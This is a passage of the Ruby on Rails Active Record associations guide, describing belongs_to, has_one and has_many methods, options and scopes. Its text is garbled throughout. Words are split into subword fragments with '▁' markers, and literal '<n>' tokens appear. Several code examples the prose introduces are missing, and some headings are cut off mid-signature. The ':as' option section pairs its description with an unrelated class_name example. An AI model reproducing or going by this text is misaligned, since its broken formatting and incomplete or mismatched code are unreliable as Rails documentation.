▁Be h in d ▁the ▁ sc en es , ▁this ▁means ▁extract ing ▁the ▁primary ▁key ▁from ▁the ▁associate ▁object ▁and ▁setting ▁this ▁object ' s ▁foreign ▁key ▁to ▁the ▁same ▁value .
▁@ order . customer ▁= ▁@ customer
▁#### # ▁` build _ association ( attributes ▁= ▁{}) `
▁The ▁` build _ association ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁this ▁object ' s ▁foreign ▁key ▁will ▁be ▁set , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁@ customer ▁= ▁@ order . build _ customer ( customer _ number : ▁123 ,
▁customer _ name : ▁" John ▁Doe ")
▁#### # ▁` create _ association ( attributes ▁= ▁{}) `
▁The ▁` create _ association ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁this ▁object ' s ▁foreign ▁key ▁will ▁be ▁set , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁@ customer ▁= ▁@ order . create _ customer ( customer _ number : ▁123 ,
▁customer _ name : ▁" John ▁Doe ")
▁#### # ▁` create _ association ! (
▁Doe s ▁the ▁same ▁as ▁` create _ association ` ▁above , ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁#### ▁ Options ▁for ▁` belongs _ to `
▁Whi le ▁Rails ▁uses ▁in t e ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` belongs _ to ` ▁association ▁reference .
▁Such ▁customizations ▁can ▁easily ▁be ▁accomplish ed ▁by ▁passing ▁options ▁and ▁scope ▁blocks ▁when ▁you ▁create ▁the ▁association .
▁For ▁example , ▁this ▁association ▁uses ▁two ▁such ▁options :
▁belongs _ to ▁: customer , ▁ dependent : ▁: destroy ,
▁ counter _ cache : ▁true
▁The ▁` belongs _ to ` ▁association ▁supports ▁these ▁options :
▁* ▁`: auto save `
▁* ▁`: class _ name `
▁* ▁`: counter _ cache `
▁* ▁`: dependent `
▁* ▁`: foreign _ key `
▁* ▁`: inverse _ of `
▁* ▁`: polymorphic `
▁* ▁`: touch `
▁* ▁`: validate `
▁#### # ▁`: auto save `
▁If ▁you ▁set ▁the ▁`: auto save ` ▁option ▁to ▁` true `, ▁Rails ▁will ▁save ▁any ▁loaded ▁member s ▁and ▁destroy ▁member s ▁that ▁are ▁ marked ▁for ▁ destruction ▁when ever ▁you ▁save ▁the ▁ parent ▁object .
▁#### # ▁`: class _ name `
▁If ▁the ▁name ▁of ▁the ▁other ▁model ▁cannot ▁be ▁d er ive d ▁from ▁the ▁association ▁name , ▁you ▁can ▁use ▁the ▁`: class _ name ` ▁option ▁to ▁supply ▁the ▁model ▁name .
▁For ▁example , ▁if ▁an ▁order ▁belongs ▁to ▁a ▁customer , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁customer s ▁is ▁` P at r on `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on "
▁#### # ▁`: counter _ cache `
▁The ▁`: counter _ cache ` ▁option ▁can ▁be ▁used ▁to ▁make ▁find ing ▁the ▁number ▁of ▁ belonging ▁objects ▁more ▁ efficient .
▁Consider ▁these ▁models :
▁With ▁these ▁declaration s , ▁as k ing ▁for ▁the ▁value ▁of ▁`@ customer . orders . size ` ▁requires ▁making ▁a ▁call ▁to ▁the ▁database ▁to ▁perform ▁a ▁` C O U N T ( * )` ▁query .
▁To ▁avoid ▁this ▁call , ▁you ▁can ▁add ▁a ▁ counter ▁cache ▁to ▁the ▁ _ belonging _ ▁model :
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁true
▁With ▁this ▁declaration , ▁Rails ▁will ▁keep ▁the ▁cache ▁value ▁up ▁to ▁date , ▁and ▁the n ▁return ▁that ▁value ▁in ▁response ▁to ▁the ▁` size ` ▁method .
▁A lthough ▁the ▁`: counter _ cache ` ▁option ▁is ▁specified ▁on ▁the ▁model ▁that ▁includes ▁the ▁` belongs _ to ` ▁declaration , ▁the ▁actual ▁column ▁must ▁be ▁added ▁to ▁the ▁ _ associated _ ▁model .
▁In ▁the ▁case ▁above , ▁you ▁would ▁need ▁to ▁add ▁a ▁column ▁named ▁` orders _ count ` ▁to ▁the ▁` C us to m er ` ▁model .
▁You ▁can ▁override ▁the ▁default ▁column ▁name ▁if ▁you ▁need ▁to :
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁: count _ of _ orders
▁Co un ter ▁cache ▁columns ▁are ▁added ▁to ▁the ▁containing ▁model ' s ▁list ▁of ▁read - only ▁attributes ▁through ▁` attr _ readonly `.
▁#### # ▁`: dependent `
▁If ▁you ▁set ▁the ▁`: dependent ` ▁option ▁to :
▁* ▁`: destroy `, ▁when ▁the ▁object ▁is ▁destroyed , ▁` destroy ` ▁will ▁be ▁called ▁on ▁its < n > associated ▁objects .
▁* ▁`: delete `, ▁when ▁the ▁object ▁is ▁destroyed , ▁all ▁its ▁ associated ▁objects ▁will ▁be < n > delete d ▁directly ▁from ▁the ▁database ▁without ▁calling ▁their ▁` destroy ` ▁method .
▁WARNING : ▁You ▁should ▁not ▁specify ▁this ▁option ▁on ▁a ▁` belongs _ to ` ▁association ▁that ▁is ▁connect ed ▁with ▁a ▁` has _ many ` ▁association ▁on ▁the ▁other ▁class .
▁Do ing ▁so ▁can ▁lead ▁to ▁or ph an ed ▁records ▁in ▁your ▁database .
▁#### # ▁`: foreign _ key `
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁on ▁this ▁model ▁is ▁the ▁name ▁of ▁the ▁association ▁with ▁the ▁ suffix ▁` _ id ` ▁added .
▁The ▁`: foreign _ key ` ▁option ▁let s ▁you ▁set ▁the ▁name ▁of ▁the ▁foreign ▁key ▁directly :
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on ",
▁foreign _ key : ▁" p at r on _ id "
▁TIP : ▁In ▁any ▁case , ▁Rails ▁will ▁not ▁create ▁foreign ▁key ▁columns ▁for ▁you .
▁You ▁need ▁to ▁explicitly ▁define ▁them ▁as ▁part ▁of ▁your ▁migrations .
▁#### # ▁`: inverse _ of `
▁The ▁`: inverse _ of ` ▁option ▁specifie s ▁the ▁name ▁of ▁the ▁` has _ many ` ▁or ▁` has _ one ` ▁association ▁that ▁is ▁the ▁inverse ▁of ▁this ▁association .
▁Doe s ▁not ▁work ▁in ▁combination ▁with ▁the ▁`: polymorphic ` ▁options .
▁#### # ▁`: polymorphic `
▁Pass ing ▁` true ` ▁to ▁the ▁`: polymorphic ` ▁option ▁indicates ▁that ▁this ▁is ▁a ▁ polymorphic ▁association .
▁P o ly m or ph ic ▁associations ▁were ▁discuss ed ▁in ▁detail ▁< a ▁ href ="# polymorphic - associations "> e ar li er ▁in ▁this ▁guide </ a > .
▁#### # ▁`: touch `
▁If ▁you ▁set ▁the ▁`: touch ` ▁option ▁to ▁`: true `, ▁the n ▁the ▁` updated _ at ` ▁or ▁` updated _ on ` ▁timestamp ▁on ▁the ▁ associated ▁object ▁will ▁be ▁set ▁to ▁the ▁current ▁time ▁when ever ▁this ▁object ▁is ▁saved ▁or ▁destroyed :
▁belongs _ to ▁: customer , ▁ touch : ▁true
▁In ▁this ▁case , ▁saving ▁or ▁destroying ▁an ▁order ▁will ▁update ▁the ▁timestamp ▁on ▁the ▁ associated ▁customer .
▁You ▁can ▁also ▁specify ▁a ▁particular ▁timestamp ▁attribute ▁to ▁update :
▁belongs _ to ▁: customer , ▁ touch : ▁: orders _ updated _ at
▁#### # ▁`: validate `
▁If ▁you ▁set ▁the ▁`: validate ` ▁option ▁to ▁` true `, ▁the n ▁ associated ▁objects ▁will ▁be ▁validate d ▁when ever ▁you ▁save ▁this ▁object .
▁By ▁default , ▁this ▁is ▁` false ` : ▁ associated ▁objects ▁will ▁not ▁be ▁validate d ▁when ▁this ▁object ▁is ▁saved .
▁#### ▁Scopes ▁for ▁` belongs _ to `
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` belongs _ to `.
▁Such ▁customizations ▁can ▁be ▁achieve d ▁via ▁a ▁scope ▁block .
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ },
▁ dependent : ▁: destroy
▁You ▁can ▁use ▁any ▁of ▁the ▁standard ▁[ query ing ▁methods ]( active _ record _ query ing . html ) ▁inside ▁the ▁scope ▁block .
▁The ▁following ▁one s ▁are ▁discuss ed ▁below :
▁#### # ▁` where `
▁The ▁` where ` ▁method ▁let s ▁you ▁specify ▁the ▁conditions ▁that ▁the ▁ associated ▁object ▁must ▁me et .
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁#### # ▁` include s `
▁You ▁can ▁use ▁the ▁` include s ` ▁method ▁to ▁specify ▁second - order ▁associations ▁that ▁should ▁be ▁ eager - load ed ▁when ▁this ▁association ▁is ▁used .
▁For ▁example , ▁consider ▁these ▁models :
▁has _ many ▁: line _ item s
▁If ▁you ▁frequent ly ▁retrieve ▁customer s ▁directly ▁from ▁line ▁items ▁( ` @ line _ item . order . customer ` ), ▁the n ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁customer s ▁in ▁the ▁association ▁from ▁line ▁items ▁to ▁orders :
▁belongs _ to ▁: order , ▁-> ▁ { ▁includes ▁: customer ▁ }
▁NOTE : ▁There ' s ▁no ▁need ▁to ▁use ▁` include s ` ▁for ▁imm edia t e ▁associations ▁- ▁that ▁is , ▁if ▁you ▁have ▁` Order ▁belongs _ to ▁: customer `, ▁the n ▁the ▁customer ▁is ▁ eager - load ed ▁automatically ▁when ▁it ' s ▁needed .
▁#### # ▁` readonly `
▁If ▁you ▁use ▁` readonly `, ▁the n ▁the ▁ associated ▁object ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁#### # ▁` select `
▁The ▁` select ` ▁method ▁let s ▁you ▁override ▁the ▁SQL ▁` SELECT ` ▁clause ▁that ▁is ▁used ▁to ▁retrieve ▁data ▁about ▁the ▁ associated ▁object .
▁By ▁default , ▁Rails ▁retrieve s ▁all ▁columns .
▁TIP : ▁If ▁you ▁use ▁the ▁` select ` ▁method ▁on ▁a ▁` belongs _ to ` ▁association , ▁you ▁should ▁also ▁set ▁the ▁`: foreign _ key ` ▁option ▁to ▁guarantee ▁the ▁correct ▁results .
▁#### ▁Do ▁Any ▁As so ci at ed ▁Object s ▁ Ex ist ?
▁You ▁can ▁see ▁if ▁any ▁ associated ▁objects ▁exist ▁by ▁using ▁the ▁` association . nil ?` ▁method :
▁if ▁@ order . customer . nil ?
▁@ m s g ▁= ▁" N o ▁customer ▁found ▁for ▁this ▁order "
▁#### ▁When ▁are ▁Object s ▁S a ve d ?
▁As sign ing ▁an ▁object ▁to ▁a ▁` belongs _ to ` ▁association ▁does ▁ _ not _ ▁automatically ▁save ▁the ▁object .
▁It ▁does ▁not ▁save ▁the ▁ associated ▁object ▁either .
▁### ▁` has _ one ` ▁Association ▁Re f er ence
▁The ▁` has _ one ` ▁association ▁creates ▁a ▁one - to - one ▁match ▁with ▁another ▁model .
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁the ▁other ▁class ▁contains ▁the ▁foreign ▁key .
▁If ▁this ▁class ▁contains ▁the ▁foreign ▁key , ▁the n ▁you ▁should ▁use ▁` belongs _ to ` ▁instead .
▁#### ▁ Method s ▁Add ed ▁by ▁` has _ one `
▁When ▁you ▁declare ▁a ▁` has _ one ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁f ive ▁methods ▁related ▁to ▁the ▁association :
▁In ▁all ▁of ▁these ▁methods , ▁` association ` ▁is ▁replaced ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ one `.
▁For ▁example , ▁given ▁the ▁declaration :
▁ Each ▁instance ▁of ▁the ▁` Supplier ` ▁model ▁will ▁have ▁these ▁methods :
▁account
▁account =
▁build _ account
▁create _ account
▁create _ account !
▁@ account ▁= ▁@ supplier . account
▁Be h in d ▁the ▁ sc en es , ▁this ▁means ▁extract ing ▁the ▁primary ▁key ▁from ▁this ▁object ▁and ▁setting ▁the ▁associate ▁object ' s ▁foreign ▁key ▁to ▁the ▁same ▁value .
▁@ supplier . account ▁= ▁@ account
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁set , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁@ account ▁= ▁@ supplier . build _ account ( ter m s : ▁" N et ▁30 ")
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁set , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁@ account ▁= ▁@ supplier . create _ account ( ter m s : ▁" N et ▁30 ")
▁#### ▁ Options ▁for ▁` has _ one `
▁Whi le ▁Rails ▁uses ▁in t e ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ one ` ▁association ▁reference .
▁Such ▁customizations ▁can ▁easily ▁be ▁accomplish ed ▁by ▁passing ▁options ▁when ▁you ▁create ▁the ▁association .
▁has _ one ▁: account , ▁class _ name : ▁" B i ll ing ", ▁ dependent : ▁: null ify
▁The ▁` has _ one ` ▁association ▁supports ▁these ▁options :
▁* ▁`: as `
▁* ▁`: primary _ key `
▁* ▁`: source `
▁* ▁`: source _ type `
▁* ▁`: through `
▁#### # ▁`: as `
▁Setting ▁the ▁`: as ` ▁option ▁indicates ▁that ▁this ▁is ▁a ▁ polymorphic ▁association .
▁For ▁example , ▁if ▁a ▁ supplier ▁has ▁an ▁account , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁account s ▁is ▁` B i ll ing `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁has _ one ▁: account , ▁class _ name : ▁" B i ll ing "
▁ Control s ▁what ▁happens ▁to ▁the ▁ associated ▁object ▁when ▁its ▁own er ▁is ▁destroyed :
▁* ▁`: destroy ` ▁cause s ▁the ▁ associated ▁object ▁to ▁also ▁be ▁destroyed
▁* ▁`: delete ` ▁cause s ▁the ▁ associated ▁object ▁to ▁be ▁deleted ▁directly ▁from ▁the ▁database ▁( so ▁callbacks ▁will ▁not ▁execute )
▁* ▁`: null ify ` ▁cause s ▁the ▁foreign ▁key ▁to ▁be ▁set ▁to ▁` NULL `.
▁ Callbacks ▁are ▁not ▁executed .
▁* ▁`: re str ic t _ with _ exception ` ▁cause s ▁an ▁exception ▁to ▁be ▁raised ▁if ▁there ▁is ▁an ▁ associated ▁record
▁* ▁`: re str ic t _ with _ error ` ▁cause s ▁an ▁error ▁to ▁be ▁added ▁to ▁the ▁own er ▁if ▁there ▁is ▁an ▁ associated ▁object
▁It ' s ▁necessary ▁not ▁to ▁set ▁or ▁leave ▁`: null ify ` ▁option ▁for ▁those ▁associations < n > that ▁have ▁` NOT ▁NULL ` ▁database ▁constraints .
▁If ▁you ▁don ' t ▁set ▁` dependent ` ▁to < n > destroy ▁such ▁associations ▁you ▁won ' t ▁be ▁able ▁to ▁change ▁the ▁ associated ▁object < n > because ▁initial ▁ associated ▁object ▁foreign ▁key ▁will ▁be ▁set ▁to ▁un allow ed ▁` NULL `< n > value .
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁on ▁the ▁other ▁model ▁is ▁the ▁name ▁of ▁this ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added .
▁has _ one ▁: account , ▁foreign _ key : ▁" s up p _ id "
▁The ▁`: inverse _ of ` ▁option ▁specifie s ▁the ▁name ▁of ▁the ▁` belongs _ to ` ▁association ▁that ▁is ▁the ▁inverse ▁of ▁this ▁association .
▁Doe s ▁not ▁work ▁in ▁combination ▁with ▁the ▁`: through ` ▁or ▁`: as ` ▁options .
▁has _ one ▁: account , ▁inverse _ of : ▁: supplier
▁belongs _ to ▁: supplier , ▁inverse _ of : ▁: account
▁#### # ▁`: primary _ key `
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁primary ▁key ▁of ▁this ▁model ▁is ▁` id `.
▁You ▁can ▁override ▁this ▁and ▁explicitly ▁specify ▁the ▁primary ▁key ▁with ▁the ▁`: primary _ key ` ▁option .
▁#### # ▁`: source `
▁The ▁`: source ` ▁option ▁specifie s ▁the ▁source ▁association ▁name ▁for ▁a ▁` has _ one ▁: through ` ▁association .
▁#### # ▁`: source _ type `
▁The ▁`: source _ type ` ▁option ▁specifie s ▁the ▁source ▁association ▁type ▁for ▁a ▁` has _ one ▁: through ` ▁association ▁that ▁proceed s ▁through ▁a ▁ polymorphic ▁association .
▁#### # ▁`: through `
▁The ▁`: through ` ▁option ▁specifie s ▁a ▁join ▁model ▁through ▁which ▁to ▁perform ▁the ▁query .
▁#### ▁Scopes ▁for ▁` has _ one `
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ one `.
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ }
▁belongs _ to ▁: re present a tive
▁class ▁Re present a tive ▁< ▁ActiveRecord :: Base
▁has _ many ▁: account s
▁If ▁you ▁frequent ly ▁retrieve ▁represent a tive s ▁directly ▁from ▁ supplier s ▁( ` @ supplier . account . re present a tive ` ), ▁the n ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁represent a tive s ▁in ▁the ▁association ▁from ▁ supplier s ▁to ▁account s :
▁has _ one ▁: account , ▁-> ▁ { ▁includes ▁: re present a tive ▁ }
▁If ▁you ▁use ▁the ▁` readonly ` ▁method , ▁the n ▁the ▁ associated ▁object ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁if ▁@ supplier . account . nil ?
▁@ m s g ▁= ▁" N o ▁account ▁found ▁for ▁this ▁ supplier "
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ one ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁its ▁foreign ▁key ).
▁In ▁addition , ▁any ▁object ▁being ▁replaced ▁is ▁also ▁automatically ▁saved , ▁because ▁its ▁foreign ▁key ▁will ▁change ▁too .
▁If ▁either ▁of ▁these ▁save s ▁fails ▁due ▁to ▁validation ▁errors , ▁the n ▁the ▁assignment ▁statement ▁returns ▁` false ` ▁and ▁the ▁assignment ▁itself ▁is ▁can ce ll ed .
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ one ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true `) ▁the n ▁the ▁ child ▁objects ▁are ▁not ▁saved .
▁They ▁will ▁automatically ▁when ▁the ▁ parent ▁object ▁is ▁saved .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ one ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` association . build ` ▁method .
▁### ▁` has _ many ` ▁Association ▁Re f er ence
▁The ▁` has _ many ` ▁association ▁creates ▁a ▁one - to - many ▁relationship ▁with ▁another ▁model .
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁the ▁other ▁class ▁will ▁have ▁a ▁foreign ▁key ▁that ▁refer s ▁to ▁instance s ▁of ▁this ▁class .
▁#### ▁ Method s ▁Add ed ▁by ▁` has _ many `
▁When ▁you ▁declare ▁a ▁` has _ many ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁ 16 ▁methods ▁related ▁to ▁the ▁association :
▁* ▁` collection ( force _ reload ▁= ▁false )`
▁* ▁` collection < < ( object , ▁ ...)
▁* ▁` collection . delete ( object , ▁ ...)
▁* ▁` collection . destroy ( object , ▁ ...)
▁* ▁` collection _ s ing ul ar _ id s `
▁* ▁` collection . clear `
▁* ▁` collection . empty ?
▁* ▁` collection . size `
▁* ▁` collection . find (...)
▁* ▁` collection . where (...)
▁* ▁` collection . exists ? (...)
▁* ▁` collection . build ( attributes ▁= ▁ { }, ▁ ...)
▁* ▁` collection . create ( attributes ▁= ▁{}) `
▁* ▁` collection . create ! (
▁In ▁all ▁of ▁these ▁methods , ▁` collection ` ▁is ▁replaced ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ many `, ▁and ▁` collection _ s ing ul ar ` ▁is ▁replaced ▁with ▁the ▁ singularize d ▁version ▁of ▁that ▁symbol .
▁orders ( force _ reload ▁= ▁false )
▁orders < < ( object , ▁ ...)
▁orders . delete ( object , ▁ ...)
▁orders . destroy ( object , ▁ ...)
▁order _ id s
▁orders . clear
▁orders . empty ?
▁orders . size
▁orders . find (...)
▁orders . where (...)
▁orders . exists ? (...)
▁orders . build ( attributes ▁= ▁ { }, ▁ ...)
▁orders . create ( attributes ▁= ▁{})
▁attributes ▁= ▁{})
▁#### # ▁` collection ( force _ reload ▁= ▁false )`
▁The ▁` collection ` ▁method ▁returns ▁an ▁array ▁of ▁all ▁of ▁the ▁ associated ▁objects .
▁If ▁there ▁are ▁no ▁ associated ▁objects , ▁it ▁returns ▁an ▁empty ▁array .
▁@ orders ▁= ▁@ customer . orders
▁#### # ▁` collection < < ( object , ▁ ...)
▁The ▁` collection < < ` ▁method ▁add s ▁one ▁or ▁more ▁objects ▁to ▁the ▁collection ▁by ▁setting ▁their ▁foreign ▁keys ▁to ▁the ▁primary ▁key ▁of ▁the ▁calling ▁model .
▁@ customer . orders ▁< < ▁@ order 1
▁#### # ▁` collection . delete ( object , ▁ ...)
▁The ▁` collection . delete ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁setting ▁their ▁foreign ▁keys ▁to ▁` NULL `.
▁@ customer . orders . delete (@ order 1 )
▁WARNING : ▁Add it ion ally , ▁objects ▁will ▁be ▁destroyed ▁if ▁they ' re ▁ associated ▁with ▁` dependent : ▁: destroy `, ▁and ▁deleted ▁if ▁they ' re ▁ associated ▁with ▁` dependent : ▁: delete _ all `.
▁#### # ▁` collection . destroy ( object , ▁ ...)
▁The ▁` collection . destroy ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁running ▁` destroy ` ▁on ▁each ▁object .
▁@ customer . orders . destroy (@ order 1 )
▁WARNING : ▁Object s ▁will ▁ _ always _ ▁be ▁removed ▁from ▁the ▁database , ▁ignoring ▁the ▁`: dependent ` ▁option .
▁The ▁` collection = ` ▁method ▁make s ▁the ▁collection ▁contain ▁only ▁the ▁supplied ▁objects , ▁by ▁adding ▁and ▁deleting ▁as ▁appropriate .
▁#### # ▁` collection _ s ing ul ar _ id s `
▁The ▁` collection _ s ing ul ar _ id s ` ▁method ▁returns ▁an ▁array ▁of ▁the ▁id s ▁of ▁the ▁objects ▁in ▁the ▁collection .
▁@ order _ id s ▁= ▁@ customer . order _ id s
▁The ▁` collection _ s ing ul ar _ id s = ` ▁method ▁make s ▁the ▁collection ▁contain ▁only ▁the ▁objects ▁identifie d ▁by ▁the ▁supplied ▁primary ▁key ▁values , ▁by ▁adding ▁and ▁deleting ▁as ▁appropriate .
▁#### # ▁` collection . clear `
▁The ▁` collection . clear ` ▁method ▁remove s ▁every ▁object ▁from ▁the ▁collection .
▁This ▁destroy s ▁the ▁ associated ▁objects ▁if ▁they ▁are ▁ associated ▁with ▁` dependent : ▁: destroy `, ▁delete s ▁them ▁directly ▁from ▁the ▁database ▁if ▁` dependent : ▁: delete _ all `, ▁and ▁otherwise ▁set s ▁their ▁foreign ▁keys ▁to ▁` NULL `.
▁#### # ▁` collection . empty ?
▁The ▁` collection . empty ?` ▁method ▁returns ▁` true ` ▁if ▁the ▁collection ▁does ▁not ▁contain ▁any ▁ associated ▁objects .
▁<% ▁if ▁@ customer . orders . empty ?
▁No ▁ Order s ▁F ound
▁#### # ▁` collection . size `
▁The ▁` collection . size ` ▁method ▁returns ▁the ▁number ▁of ▁objects ▁in ▁the ▁collection .
▁@ order _ count ▁= ▁@ customer . orders . size
▁#### # ▁` collection . find (...)
▁The ▁` collection . find ` ▁method ▁find s ▁objects ▁within ▁the ▁collection .
▁It ▁uses ▁the ▁same ▁syntax ▁and ▁options ▁as ▁` ActiveRecord :: Base . find `. < n >< n >
▁@ open _ orders ▁= ▁@ customer . orders . find (1)
▁#### # ▁` collection . where (...)
▁The ▁` collection . where ` ▁method ▁find s ▁objects ▁within ▁the ▁collection ▁base d ▁on ▁the ▁conditions ▁supplied ▁but ▁the ▁objects ▁are ▁loaded ▁ la z ily ▁meaning ▁that ▁the ▁database ▁is ▁ q u er i ed ▁only ▁when ▁the ▁object ( s ) ▁are ▁access ed . < n >< n >
▁@ open _ orders ▁= ▁@ customer . orders . where ( open : ▁true ) ▁# ▁No ▁query ▁yet
▁@ open _ order ▁= ▁@ open _ orders . first ▁# ▁Now ▁the ▁database ▁will ▁be ▁ q u er i ed
▁#### # ▁` collection . exists ? (...)
▁The ▁` collection . exists ?` ▁method ▁check s ▁whether ▁an ▁object ▁me et ing ▁the ▁supplied ▁< n > condition s ▁exists ▁in ▁the ▁collection .
▁#### # ▁` collection . build ( attributes ▁= ▁ { }, ▁ ...)
▁The ▁` collection . build ` ▁method ▁returns ▁one ▁or ▁more ▁new ▁objects ▁of ▁the ▁ associated ▁type .
▁These ▁objects ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁their ▁foreign ▁key ▁will ▁be ▁created , ▁but ▁the ▁ associated ▁objects ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁@ order ▁= ▁@ customer . orders . build ( order _ date : ▁Time . now ,
▁order _ number : ▁" A 12345 ")
▁#### # ▁` collection . create ( attributes ▁= ▁{}) `
▁The ▁` collection . create ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁created , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁@ order ▁= ▁@ customer . orders . create ( order _ date : ▁Time . now ,
▁order _ number : ▁" A 12345 ")
▁#### # ▁` collection . create ! (
▁Doe s ▁the ▁same ▁as ▁` collection . create ` ▁above , ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁#### ▁ Options ▁for ▁` has _ many `
▁Whi le ▁Rails ▁uses ▁in t e ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ many ` ▁association ▁reference .
▁has _ many ▁: orders , ▁ dependent : ▁: delete _ all , ▁validate : ▁: false
▁The ▁` has _ many ` ▁association ▁supports ▁these ▁options :
▁For ▁example , ▁if ▁a ▁customer ▁has ▁many ▁orders , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁orders ▁is ▁` Trans action `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁has _ many ▁: orders , ▁class _ name : ▁" Trans action "
▁ Control s ▁what ▁happens ▁to ▁the ▁ associated ▁objects ▁when ▁their ▁own er ▁is ▁destroyed :
▁* ▁`: destroy ` ▁cause s ▁all ▁the ▁ associated ▁objects ▁to ▁also ▁be ▁destroyed
▁* ▁`: delete _ all ` ▁cause s ▁all ▁the ▁ associated ▁objects ▁to ▁be ▁deleted ▁directly ▁from ▁the ▁database ▁( so ▁callbacks ▁will ▁not ▁execute )
▁* ▁`: null ify ` ▁cause s ▁the ▁foreign ▁keys ▁to ▁be ▁set ▁to ▁` NULL `.
▁* ▁`: re str ic t _ with _ exception ` ▁cause s ▁an ▁exception ▁to ▁be ▁raised ▁if ▁there ▁are ▁any ▁ associated ▁records
▁* ▁`: re str ic t _ with _ error ` ▁cause s ▁an ▁error ▁to ▁be ▁added ▁to ▁the ▁own er ▁if ▁there ▁are ▁any ▁ associated ▁objects
▁has _ many ▁: orders , ▁foreign _ key : ▁" c us t _ id "
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁primary ▁key ▁of ▁the ▁association ▁is ▁` id `.
